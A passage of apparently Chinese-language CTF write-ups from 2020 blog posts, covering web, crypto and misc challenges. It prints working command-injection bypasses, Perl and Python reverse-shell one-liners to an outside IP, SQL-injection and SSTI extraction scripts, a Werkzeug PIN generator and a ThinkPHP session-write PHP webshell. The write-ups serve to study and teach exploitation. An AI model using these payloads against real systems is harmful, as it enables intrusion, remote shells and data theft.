$m)) { $cmd = \"ping -c 4 {$ip}\"; exec($cmd, $res); } else { $res = $m; }}?&gt; 可以看到对ip传参内容中的连接符、空格、cat命令、flag字段进行了过滤，对空格过滤很简单，${IFS}就行，之前的一篇博客也写过，对cat和flag的过滤也很简单，用\\即可绕过：ca\\t f\\lag，关键就在于对|、&amp;、;三个连接符的过滤，最初没有考虑是GET传参，忘记了用%0a代替;，而是选择用8/16进制进行绕过，从而跳进了大坑…这种方法构造思路就是：利用字符的ascii码对应的8/16进制表示字符，结合printf命令输出字符串，然后利用$将字符串当作命令执行，比如： ls：$(printf${IFS}\"\\154\\163\") 但是构造的payload一直没打通，于是本地测了一下：原来是输出的内容被当作ip的一部分了… 但是没搞懂为啥这样构造出来的字符会被当做前面命令的一部分… 解题由于是GET传参，利用连接符的url编码就能绕过，比如;对应%0a，构造payload如下： ip=127.0.0.1%0acd${IFS}fl\\ag_is_here%0aca\\t${IFS}fl\\ag_64331483515023.php 即可拿到flag：这里的cat其实还可以用more、less、tail、sort命令替换，具体可以查一下几个命令的区别。对文件名的过滤也可以通过利用变量的形式来绕过，网上有很多例子可以参考，这里不再写了。 关于更多命令注入的绕过姿势可以参考这里。","link":"/2020/03/03/CTFHub%E9%83%A8%E5%88%86%E8%AE%B0%E5%BD%95/"},{"title":"V&N公开赛","text":"隔离在家无事做，打打比赛乐趣寻~ 卧槽！毕设还没开始？！🤨 TimeTravel考察CVE-2016-5385：可以理解为伪造代理吧。 题目分析&lt;?phperror_reporting(0);require __DIR__ . '/vendor/autoload.php';use GuzzleHttp\\Client;highlight_file(__FILE__);if(isset($_GET['flag'])) { $client = new Client(); $response = $client-&gt;get('http://127.0.0.1:5000/api/eligible'); $content = $response-&gt;getBody(); $data = json_decode($content, TRUE); if($data['success'] === true) { echo system('/readflag'); }}if(isset($_GET['file'])) { highlight_file($_GET['file']);}if(isset($_GET['phpinfo'])) { phpinfo();} 审计代码，可以看到使用了Guzzle： Guzzle是一个使得利用PHP实现发送HTTP请求，方便和web service集成的PHP客户端模拟组件。一句话，它就像一个PHP写的浏览器。当你的服务端程序需要作为客户端来访问其他的service服务时，这就是你所需要的。简单的接口构建query string，POST requests,streaming large uploads/downloads,使用HTTP cookies,上传json data等。 根据代码逻辑，我们可以通过flag传参来拿到flag，但是是通过在服务器上创建一个client()，然后利用这个client去访问本地5000端口下的/api/eligible文件夹下的文件，将返回的json数据解码之后，如果字段里的success为true，即可拿到flag。 关键就在于$client-&gt;get('http://127.0.0.1:5000/api/eligible')，题目服务器上肯定是没有这个了，想要实现要么可以通过拿到shell写入，要么就是代理到VPS上。通过phpinfo可以看到，接口用的是fastCGI：找到的CVE-2016-5385就是通过CGI来伪造代理，大致原理： cgi(fastcgi)要将用户传入的所有HTTP头都加上HTTP_前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的HTTP_PROXY值作为HTTP代理地址。于是，恶意用户通过提交Proxy: http://evil.com这样的HTTP头，将使用缺陷类库的网站的代理设置为http://evil.com，进而窃取数据包中可能存在的敏感信息。 于是，我们就可以理一下解题思路了： 1、在VPS上构造/api/eligible/index.php，并且读取到的结果要包含{“success”:true}，可以参考下面的index.php的代码 2、利用php -S localhost:5000在VPS上打开web服务的端口，注意：在包含/api/eligible/index.php的文件夹下开启web服务 3、通过flag传参，抓包，在请求头中加入：http://ip:port，此处的ip是VPS的ip(由于BUU要求内网环境，这里就填内网机器的ip)，port为VPS上一个开启的端口，可以利用php -S命令开启两个web服务端口来进行 //index.php&lt;?php$data = array();$data['success'] = true; $json_string = json_encode($data);echo $json_string; ?&gt; 由于BUU上需要用内网，就在BUU中开了一个内网环境作为VPS：如此以来，VPS就成为代理了，后面的$client-&gt;get('http://127.0.0.1:5000/api/eligible')也就在VPS上执行了，从而找到指定文件，返回{“success”:true}，进而通过后面的判断，拿到flag。 CHECKIN考察利用perl或python反弹shell，通过文件描述符读取被删除的文件内容。 题目分析题目源码如下： from flask import Flask, request import os app = Flask(__name__) flag_file = open(\"flag.txt\", \"r\") # flag = flag_file.read() # flag_file.close() # @app.route('/flag') # def flag():# return flag#want flag? naive! # You will never find the thing you want:) I think @app.route('/shell') def shell(): os.system(\"rm -f flag.txt\") exec_cmd = request.args.get('c') os.system(exec_cmd) return \"1\" @app.route('/') def source(): return open(\"app.py\",\"r\").read() if __name__ == \"__main__\": app.run(host='0.0.0.0') 可以看到，flag文件首先被读取了，读取文件的进程在内存中是存在的，因此当我们通过/shell?c=来传入命令的时候，虽然会先删掉flag文件，但是flag内容仍然在内存里，通过读取/proc/PID/fd/文件描述符来读取。解题的关键就是通过参数c利用system执行命令来反弹shell，然后去进程信息中找flag。 在这里curl不能用了，但是还可以利用perl、python、ruby等语言来反弹shell，pyload如下： /shell?c=perl%20-MIO%20-e%20%27$p=fork;exit,if($p);$c=new%20IO::Socket::INET(PeerAddr,%22174.0.216.133:2017%22);STDIN-%3Efdopen($c,r);$~-%3Efdopen($c,w);system$_%20while%3C%3E;%27 /shell?c=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22174.0.216.133%22,2017));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 注意是反弹shell到VPS上，但是BUU需要用内网环境，和上题一样，开一个BUU的内网环境，通过nc -l -p 2017监听端口:然后利用上面的payload访问即可反弹shell利用perl反弹的shell如下：利用python反弹的shell：其实还是python反弹的好用些。 通过cat /proc/PID/fd/文件描述符一个个地找就能拿到flag了。 HappyCTFd考察刚爆出的CTFd存在的一个CVE，CVE-2020-7245 解题上面的CVE链接中讲的已经很清楚了，整体的解题思路就是： 1、注册一个admin用户，(注意前面的空格) 2、更改上面用户的密码，即利用注册的邮箱来更改密码 3、成功修改管理员的密码并登录 注意BUU的内网环境需要用内网里的邮箱，否则收不到邮件，巨坑… 登录之后，在管理通道发现flag在哪里一个题目，把它的隐藏属性改为可见的，再到challenge页面即可看到该题目，下载附件即可拿到flag。 拉胯的三条命令想到了热剧“亲爱的，热爱的”… 解题下载附件之后，将后缀改为.zip解压发现一个数据包和一个提示的txt文件，提示将数据包中的端口从小到大排列即为flag。利用tcpdump直接读数据包中的端口，然后就能拿到flag，命令如下： tcpdump -n -r nmapll.pcapng 'tcp[13]=18' | awk '{print $3}' | sort -u 效果如下：组合即为flag。","link":"/2020/02/29/V&N%E5%85%AC%E5%BC%80%E8%B5%9B/"},{"title":"安恒-抗疫月赛","text":"抗疫抗疫！来自安全人员的行动！ Web-easy-hash考察md5强比较、弱比较以及md5碰撞，本题是掘安杯的audit题改的，参考getfly师傅的博客。 解题进入题目，给出了源码如下： &lt;?phphighlight_file(__FILE__);error_reporting(0);$val1 = @$_GET['val1'];$val2 = @$_GET['val2'];$val3 = @$_GET['val3'];$val4 = @$_GET['val4'];$val5 = (string)@$_POST['val5'];$val6 = (string)@$_POST['val6'];$val7 = (string)@$_POST['val7'];if( $val1 == $val2 ){ die('val1 OR val2 no no no');}if( md5($val1) != md5($val2) ){ die('step 1 fail');}if( $val3 == $val4 ){ die('val3 OR val4 no no no');}if ( md5($val3) !== md5($val4)){ die('step 2 fail');}if( $val5 == $val6 || $val5 == $val7 || $val6 == $val7 ){ die('val5 OR val6 OR val7 no no no');}if (md5($val5) !== md5($val6) || md5($val6) !== md5($val7) || md5($val5) !== md5($val7)){ die('step 3 fail');}if(!($_POST['a']) and !($_POST['b'])){ echo \"come on!\"; die();}$a = $_POST['a'];$b = $_POST['b'];$m = $_GET['m'];$n = $_GET['n'];if (!(ctype_alnum($a)) || (strlen($a) &gt; 5) || !(ctype_alnum($b)) || (strlen($b) &gt; 6)){ echo \"a OR b fail!\"; die();}if ((strlen($m) &gt; 1) || (strlen($n) &gt; 1)){ echo \"m OR n fail\"; die();}$val8 = md5($a);$val9 = strtr(md5($b), $m, $n);echo PHP_EOL;echo \"&lt;p&gt;val8 : $val8&lt;/p&gt;\";echo PHP_EOL;echo \"&lt;p&gt;val9 : $val9&lt;/p&gt;\";echo PHP_EOL;if (($val8 == $val9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 5)){ echo \"nice,good job,give you flag:\"; echo file_get_contents('/var/www/html/flag.php');} 分析代码可以看到，我们需要找到满足md5弱比较条件的val1和val2，这个网上有很多： 0e开头的md5和原值：QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 然后需要利用md5强比较绕过对val3和val4的判断，由于没有要求是字符串，因此利用数据进行绕过： val3[]=1&amp;val4[]=2 再往下看，对val5、val6和val7进行了(string)的限制，这里的判断是真正需要进行md5碰撞了，网上能找到很多数据有微小差别但是md5值相同的例子，但是都是两个一对的，但是本题有三个变量，需要借助这个工具来生成值不同但是md5相同的文件。 然后是对a、b、m和n的判断：ctype_alnum($a\\b)判断a\\b是否是字母和数字或字母数字的组合；同时要求m和n长度不能超过1。 然后令$val8 = md5($a)，$val9 = strtr(md5($b), $m, $n)将md($b)中与$m相同的值替换为$n的值。最后还需要满足($val8 == $val9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 5)，这个地方利用md5弱碰撞就行，利用QNKCDZO/0e830400451993494058024219903391类的字符串，找一个长度为5且md5值以0e开头后面全是数字的字符串$a，另找一个0e开头后面为纯数字/一位字母的字符串$b，若0e后面是一个字母和其他的数字，利用strtr()函数将其md5值中字母改为数字即可。 难点就在于找满足要求的$a和$b的值了，这里参考getfly师傅的脚本来爆破： # 爆破数字+字母，找到符合md5后为0e开头，且后面为纯数字/一位字母的字符串import stringimport itertoolsimport hashlibdic = string.ascii_lowercase + string.ascii_uppercase + string.digitstime = 0for n in itertools.permutations(dic, 5): print('trying', time) time += 1 i = ''.join(n) li = [0] * 26 count = 0 strs = hashlib.md5(str(i).encode('utf-8')).hexdigest() if strs[:2] == '0e': for j in strs[2:]: if ord(j) &gt;= 97: li[ord(j)-97] += 1 for k in li: if k != 0: count += 1 if count &lt; 1: print(i) break 最后利用构造好的payload写脚本拿flag。 解题脚本import requestsurl = 'http://183.129.189.60:10004/?val1=QNKCDZO&amp;val2=s878926199a&amp;val3[]=1&amp;val4[]=2&amp;m=a&amp;n=1'file1 = open('out_test_000.txt', 'rb').read()file2 = open('out_test_001.txt', 'rb').read()file3 = open('out_test_002.txt', 'rb').read()data = {'val5':file1, 'val6':file2, 'val7':file3, 'a':'byGcY', 'b':'aOtm2'}s = requests.post(url, data)print(s.text) Crypto-古典密码进入题目，分别给了一组凯撒密码加密的字符串、一组morse码、一组栅栏密码加密的字符串，分别解密即可。 Crypto-RSA跟前两天Ichunqiu的抗疫赛中的一道RSA题一样，考察共模攻击 解题附件代码如下： from flag import flagfrom Crypto.Util.number import *p=getPrime(1024)q=getPrime(1024)e=65537n=p*qm=bytes_to_long(flag)c=pow(m,e,n)print c,e,ne=11187289n=p*qm=bytes_to_long(flag)c=pow(m,e,n)print c,e,n'''3398498381912395819190972489172462865619978412426461006637853132394421358554444085509204376417687407497725837275868696481008111895766215578504776574832032556271718345687763315140723387608016365200919607751172500433727679269003098314988424638473027123820847847826679169000817669427223462669128173658466684135284118199815059085013479646863344355311315928713888347485004116168388822942797985291207722712351376891776564431593839662958249777540851019964959285093222467104765037231393043482615879794268339523066822738215251088897330388858109680412562153811860413533184870172160079371279534423386236128033224501238509297353 65537 215502791026440531374017943574509443026107313903012946787932507273960893580727006585712607959101122653095680142961222883845164478958272011115310543865300164329049899272167015075873664468026668483228537817299054927286554748325123815056279405558543083645781082659623880443631332464147537682295648462751543118983839938922932971224286619609462079509945608989640549131944621872428186332959700277410852011221557261307590459577578339426165440660550816007923664116919793507448949389949153288746002296844775332202404896001717469438491798036931220818883242589877791312231505899532489296799311421342081510430007932725208742059333466733921305804638105947202761163747472618602445995245253771384553216569474005211746398256742813639292824489920799418551206486872148557599625985549276697777903434273072767901043963396047653458242735767809413051298636887840641872939342025101757793615068691040228073377366562557622977332819376942596081135968249279010542277871138668977160241877260538203101507006391433015105607006204397243716334344883925947719719479074061998068934050946968531874465924912747079003982022188875112147185558223515367430238618463189740762128953957802291125793882636020335117593003197811477506533564676975831899876919568948425610130348710 11187289 21550279102644053137401794357450944302610731390301294678793250727396089358072700658571260795910112265309568014296122288384516447895827201111531054386530016432904989927216701507587366446802666848322853781729905492728655474832512381505627940555854308364578108265962388044363133246414753768229564846275154311898383993892293297122428661960946207950994560898964054913194462187242818633295970027741085201122155726130759045957757833942616544066055081600792366411691979350744894938994915328874600229684477533220240489600171746943849179803693122081888324258987779131223150589953248929679931142134208151043000793272520874205933''' 明显地看出是使用相同的模数n、两个不同的e生成了两个密文c，直接上POC： import sysimport binasciisys.setrecursionlimit(1000000)def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % mn = 21550279102644053137401794357450944302610731390301294678793250727396089358072700658571260795910112265309568014296122288384516447895827201111531054386530016432904989927216701507587366446802666848322853781729905492728655474832512381505627940555854308364578108265962388044363133246414753768229564846275154311898383993892293297122428661960946207950994560898964054913194462187242818633295970027741085201122155726130759045957757833942616544066055081600792366411691979350744894938994915328874600229684477533220240489600171746943849179803693122081888324258987779131223150589953248929679931142134208151043000793272520874205933e1 = 65537e2 = 11187289c1 = 3398498381912395819190972489172462865619978412426461006637853132394421358554444085509204376417687407497725837275868696481008111895766215578504776574832032556271718345687763315140723387608016365200919607751172500433727679269003098314988424638473027123820847847826679169000817669427223462669128173658466684135284118199815059085013479646863344355311315928713888347485004116168388822942797985291207722712351376891776564431593839662958249777540851019964959285093222467104765037231393043482615879794268339523066822738215251088897330388858109680412562153811860413533184870172160079371279534423386236128033224501238509297353c2 = 3466733921305804638105947202761163747472618602445995245253771384553216569474005211746398256742813639292824489920799418551206486872148557599625985549276697777903434273072767901043963396047653458242735767809413051298636887840641872939342025101757793615068691040228073377366562557622977332819376942596081135968249279010542277871138668977160241877260538203101507006391433015105607006204397243716334344883925947719719479074061998068934050946968531874465924912747079003982022188875112147185558223515367430238618463189740762128953957802291125793882636020335117593003197811477506533564676975831899876919568948425610130348710s = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = modinv(c1, n)elif s2&lt;0: s2 = - s2 c2 = modinv(c2, n)m=(pow(c1,s1,n)*pow(c2,s2,n)) % nprint (binascii.unhexlify(hex(m)[2:].strip(\"L\"))) Misc-lemonEssence考察CRC爆破 解题下载压缩包解压出如下一张PNG图片：缩略图可以看，但是放大之后看不了，猜测是对其高或宽进行了更改，需要进行CRC爆破以获得原来的宽和高，修改回去就行了。利用Winrar拿到其CRC，然后利用下面的脚本爆破： import zlibimport structcrc32key = 0x986B9E93data = bytearray(b'\\x49\\x48\\x44\\x52\\x00\\x00\\x01\\x69\\x00\\x00\\x01\\x25\\x08\\x02\\x00\\x00\\x00') #表示宽和高部分的字节(13-29bytes)n = 4095 #理论上0xffffffff,但考虑到屏幕实际/cpu，0x0fff就差不多了for w in range(n): #高和宽一起爆破 width = bytearray(struct.pack('&gt;i', w)) #q为8字节，i为4字节，h为2字节 for h in range(n): height = bytearray(struct.pack('&gt;i', h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = zlib.crc32(data) if crc32result == crc32key: print(width,height) exit(0) 把爆破出地结果与图片数据对比，发现高的部分被更改了，如图更改回去即可看到flag：","link":"/2020/02/26/%E5%AE%89%E6%81%92-%E6%8A%97%E7%96%AB%E6%9C%88%E8%B5%9B/"},{"title":"ichunqiu新春战疫赛-WriteUp","text":"最近的几个公益赛确实办的不错，安全人员也都是很热爱祖国的♥，中国加油😠 武汉加油😠 大家加油😠 Web-简单的招聘系统考察SQL注入 解题测试发现登录的username处存在注入，万能密码就能登录这个地方存在注入点，可以利用盲注爆库，这里利用的思路就是通过判断用户名的条件为true登录进行注入，当然还需要一个现有的用户来登录，那么我们注册个用户就行了，参考如下的脚本： import requestsurl = 'http://4b5b40858ffa4258bd74ee72c106522abdc060eb08674169.changame.ichunqiu.com/index.php'# payload = \"2' and (select (mid((select database()),1,{0})))!='{1}\"# payload = \"2' and (select (mid((select table_name from information_schema.tables where table_schema='nzhaopin' limit 1 offset 3),1,{0})))!='{1}\"# payload = \"2' and (select (mid((select column_name from information_schema.columns where table_name='flag' limit 1 offset 1),1,{0})))!='{1}\"payload = \"2' and (select (mid((select flaaag from flag limit 1 offset 0),1,{0})))!='{1}\"# backup flag user flag: id flaaagdatabase = ''letter = 'abcdefghijklmnopqrstuvwxyz0123456789_-{}'for i in range(1, 80): for n in letter: data = { \"lname\": payload.format(i, database + n), \"lpass\": \"xxx\" } req = requests.post(url, data=data) req.encoding = 'gbk' # print(req.encoding) print(data[\"lname\"]) # print(req.text.encode('gbk').decode(req.apparent_encoding)) if \"成功\" not in req.text.encode('gbk').decode(req.apparent_encoding): print(\"* \" + n) database += n break Web-ezupload文件上传题 解题本以为是一道拐弯的上传题，结果直接传上马了…蚁剑连上，flag文件是空的，但是下面有个/readflag文件，开中断运行这个程序就能拿到flag。 Web-盲注利用正则进行时间盲注 解题题目已经说的很明显了，需要进行盲注，但是有waf，过滤了很多常用的注入语句，但是REGEXP并没有被ban，那么利用这个函数很简单地就能拿到flag。REGEXP：在列值内进行匹配，如果被匹配的文本在列值中出现，REGEXP将会找到它，相应的行将被返回，REGEXP能匹配整个列值。并且REGEXP检查总是返回0（没有匹配）或1（匹配）。 import requestsimport timeurl = 'http://49682a5d648a44fe94ba09271ec5fbe569c33f63b1c6435b.changame.ichunqiu.com/?id='flag = ''letter = 'abcdefghijklmnopqrstuvwxyz0123456789{}-'for i in range(99): for n in letter: payload = '1 and if((fl4g REGEXP \"^{0}\"),sleep(3),5);' payload = payload.format(flag+n) start_time = time.time() req = requests.get(url+payload) #print(req.text) if (time.time() - start_time)&gt;2: print(flag) flag += n break Web-blacklist本题是[强网杯]随便注的改版，考察堆叠注入，这题get到注入新姿势，利用mysql数据库中HANDLER绕过黑名单拿flag。 解题进入题目发现跟强网杯一样的输入框，首先就想到了堆叠注入，测试一下：可以看到，语法成功执行了。但是再去测试其他关键字的时候发现很多关键字被ban了：本想着利用强网杯的方法，通过改表名来拿flag的，但是rename也被ban了，结合select又被ban，常规的姿势怕是不行，后来借用handler才拿到flag，payload如下： 1';handler FlagHere open;handler FlagHere read first;# 关于handler可以参考这里。 Web-easysqli_copy还是考察PDO、check()函数的绕过、实际盲注，不过这题也get到了新姿势：利用预处理语句进行堆叠注入，这也是采用了PDO之后注入的新趋势了。扩展一下知识： 在php中，PDO有两种模式：模拟预编译与非模拟预编译。默认为模拟预编译模式，即不是真正的预编译，而是采用PDO::quote()函数，首先将用户输入转化为字符型，之后将引号等敏感字符转义。这样在gbk编码下，即可通过宽字节注入绕过防护。但是绕过PDO之后，依然很难绕过check()函数，于是此处利用到了PDO的第二个默认特性：支持多句执行，即可进行堆叠注入。 题目分析进入题目给出了源码： &lt;?php function check($str) { if(preg_match('/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\\^|&amp;|database/i',$str,$matches)) { print_r($matches); return 0; } else { return 1; } } try { $db = new PDO('mysql:host=localhost;dbname=pdotest','root','******'); } catch(Exception $e) { echo $e-&gt;getMessage(); } if(isset($_GET['id'])) { $id = $_GET['id']; } else { $test = $db-&gt;query(\"select balabala from table1\"); $res = $test-&gt;fetch(PDO::FETCH_ASSOC); $id = $res['balabala']; } if(check($id)) { $query = \"select balabala from table1 where 1=?\"; $db-&gt;query(\"set names gbk\"); $row = $db-&gt;prepare($query); $row-&gt;bindParam(1,$id); $row-&gt;execute(); } 通过源码发现，这里利用了PDO接口进行与数据库的链接，其中prepare就是准备了一个预处理语句，$row-&gt;bindParam(1,$id);中的binParam作用是绑定一个参数到指定的变量名。请教别的师傅了解到PDO中单引号可能是被自动过滤的，那就只好利用宽字节绕过：%df%27，源码里利用了预处理语句，注入的时候也就选择了利用预处理语句进行注入，同时结合16进制编码绕过对关键字的过滤。 解题脚本如下： import requestsimport timedef main(): url = 'http://96e2f11ccc1147559b9e8c7c9991e494c4dd1d4ca36f4428.changame.ichunqiu.com/?id=1%df%27;' payloads = \"set @a=0x{0};prepare ctftest from @a; execute ctftest;\" flag = '' letter = 'abcdefghijklmnopqrstuvwxyz0123456789{}-' for m in range(1, 80): print(\"前{0}位\".format(m)) payload = \"select if (ascii(mid((select fllllll4g from table1 ),{0},1))={1}, sleep(3), 1)\" # 由于我们会转换为十六进制，所以不存在任何过滤，关键词随便使用 for n in letter: # print(payload.format(m, n)) xxx = url + payloads.format(str_to_hex(payload.format(m, ord(n)))) # print(xxx) times = time.time() res = requests.post(xxx) if time.time() - times &gt;= 2: flag += n print(flag) breakdef str_to_hex(s): return ''.join([hex(ord(c)).replace('0x', '') for c in s]) # 字符串转换为16进制的函数if __name__ == '__main__': main() Web-Easqli考察盲注，这题也学到了新姿势：在union select被ban的情况下，进行多列数据的爆破。 题目分析进入题目是一个大大的输入框，多次尝试发现输入1的时候回显Hello Nu1L，输入0的时候回显hello，后来测试了多个关键字，发现union select单用的时候没问题，联合起来使用怎么都绕不过，or、and也被ban了，但是&amp;&amp;没被ban，这里有搞头，然后测了一下，语句为true回显也是hello Nu1L，就从这里下手了。后来又发现information_schema也被ban了，这时候想到了之前一个题里讲过的：利用mysql系统库sys.schema_table_statistics_with_buffer或者sys.schema_auto_increment_columns获取到了表名，但是因为union select被ban，无列名注入也没法进行，这时候就用到了前面说的学到的新姿势了：利用id=2-(select (select 1,{0})&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))&quot;这样的语句使进行两列的对比，从而爆破出第二列(flag列)的内容。脚本如下： 解题脚本import requestsurl = 'http://ab8f8551f4dc43a4bc43854950cb1088190a260570ee455c.changame.ichunqiu.com/index.php'headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"}# payload = \"1 &amp;&amp; mid((select database()),1,{0})='{1}'\"# payload = \"1 &amp;&amp; mid((select table_name from sys.schema_table_statistics_with_buffer where table_schema='ctf' limit 1 offset 1),1,{0})='{1}'\"# payload = \"1 &amp;&amp; mid((select column_name from sys.schema_auto_increment_columns where table_name='f1ag_1s_h3r3_hhhhh' limit 1),1,{0})='{1}'\" #不可用，需要进行无列名查询# payload = \"1 &amp;&amp; mid((select * from f1ag_1s_h3r3_hhhhh limit 1),1,{0})='{1}'\" #不可用，因为有两列database = ''letter = '0123456789bcdehijkmnopqrstuvwxyz_-{}''''for i in range(1, 80): for n in letter: data = { \"id\": payload.format(i, database + n), } req = requests.post(url, data=data,headers=headers) # print(req.text.encode('gbk').decode(req.apparent_encoding)) if \"Hello Nu1L\" in req.text: print(n) flag += n print(database) break'''flag=''while 1: for i in range(32,126): a = chr(i).encode().hex() payload = \"id=2-(select (select 1,0x%s)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))\"%(flag.encode().hex()+a) #创建两列数据去比较 #print(\"Test:\"+chr(i)) html = requests.post(url=url,data=payload,headers=headers) if \"Hello Nu1L\" in html.text: flag += chr(i-1) print(\"Find:\"+flag) break if chr(i) == '}': flag +='}' breakprint(flag) Web-FlaskApp考察SSTI 题目分析进入题目发现是一个base64加密解密网站，直接考虑SSTI了。并且这个题跟另外一个利用Flask写的加密的题很像，便参考了那个题的解题思路：在开启DEBUG模式的情况下进行模板注入。首先测试一下SSTI是否能用：先在加密页面对加密一下，然后到解密页解密，页面回显如下：由此得知，确实是SSTI，同时还看到了开启了DEBUG模式。那就利用那道题的解题思路去做吧。 解题参考前面的链接我们知道，这道题可以通过计算出PIN来登录控制台，然后在控制台进行操作拿flag。但是生成PIN的脚本需要知道username(这个需要我们自己去找)、modname(一般是flask.app)、第三个值getattr(app, &quot;__name__&quot;, app.__class__.__name__)(一般是Flask)、第四个值getattr(mod, &quot;__file__&quot;, None)(在报错页面可以看到题目的环境)、第五个是str(uuid.getnode())的值，最后是机器码。报错页面回显如下： 获取username可以在/etc/passwd中读取到用户名，这里由于题目环境是Python3的，因此读文件需要用如下payload： {{ ''.__class__.__mro__[1].__subclasses__()[103].__init__.__globals__['open']('/etc/passwd').read() }} 如果环境是Python2，payload可以构造为： {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }} 跟前面的操作一样，先编码，再去解码引发SSTI，回显如下：我们看到可以用户名flaskweb，应该就是它了。 modename以及第三个、第四个已经知道了，直接去找str(uuid.getnode())的值。 获取str(uuid.getnode())构造payload： {{ ''.__class__.__mro__[1].__subclasses__()[103].__init__.__globals__['open']('/sys/class/net/eth0/address').read()}} 按照同样的方法进行注入，得到回显如下：然后到进制转换网站转换为十进制。 获取机器码构造payload： {{ ''.__class__.__mro__[1].__subclasses__()[103].__init__.__globals__['open']('/proc/self/cgroup').read()}} 回显如下：第一项/docker/后面的字符串即为我们要找的机器码。至此，拿到了生成PIN的所有的要素了，利用下面的脚本生成PIN： import hashlibfrom itertools import chainprobably_public_bits = [ 'flaskweb'# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [ '2485377957890',# str(uuid.getnode()), /sys/class/net/ens33/address '3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320'# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 然后到题目的链接后面加上/console进入控制面板，输入PIN，获取权限：然后就可以随意输入读取文件拿flag了(注意列举文件的时候也可以直接列举根目录的ls /)： Web-easy_thinking考察ThinkPHP6.0存在的通过SESSION写文件的漏洞，同时也考察了对disable_functions的绕过。这一道题比赛的时候知道考察点是SESSION漏洞了，但是由于时间原因当时没有做出来，后来经smity师傅提示，结合getfly师傅的题解，对这道题加深了理解和学习。在BUU上复现了一下。 题目分析由于环境是ThinkPHP6.0，网上查了一下，找到了相关的漏洞文章：https://blog.csdn.net/god_zzZ/article/details/104275241https://paper.seebug.org/1114/#_1就是通过利用SESSION向服务器写入文件，从而拿到shell。 既然是通过SESSION写入文件，我们就需要找到存在SESSION写入的位置，在Member控制器中发现如下代码： if (!session('?UID')){ return redirect('/home/member/login'); }$data = input(\"post.\");$record = session(\"Record\");if (!session(\"Record\")){ session(\"Record\",$data[\"key\"]);} 可以看到，在search方法中可以进行任意SESSION写入，在这个地方我们就可以写入构造好的内容来生成shell，但是首先就需要满足第一个判断，即需要一个现有的SESSION文件并且包含UID字段，下面就需要找到将UID写入SESSION的地方。在Member控制器的login方法中找到如下代码： if ($userId){ session(\"UID\",$userId); return redirect(\"/home/member/index\");} 将UID写入SESSION的操作是在判断用户名和密码正确之后的，那么我们就需要先注册一个合法的用户进行登录。 捋一下整个的思路： 1、注册一个合法账户 2、利用注册的账户登录时更改SESSION字段的值为xxx.php，并且刚好是32个字符 3、利用相同的SESSION在搜索的时候写入一句话 4、在/runtime/session文件夹下测试一句话，注意是sess_开头的 参考getfly师傅的脚本： import requestsurl_reg = 'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/register'url_log = 'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/login'url_sea = 'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/search'headers = { 'Cookie':'PHPSESSID=1234567890123456789012345678.php' }data1 = {'username':'ggb0n', 'password':'123456'}data2 = {'key':'&lt;?php @eval($_POST[\"x\"]);echo \"not flag\"; ?&gt;'}s1 = requests.post(url_reg, data1)s2 = requests.post(url_log, data1, headers=headers)s3 = requests.post(url_sea, data2, headers=headers)test = 'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/runtime/session/sess_1234567890123456789012345678.php's = requests.get(test).textif 'not flag' in s: print('success')else: print('failed') 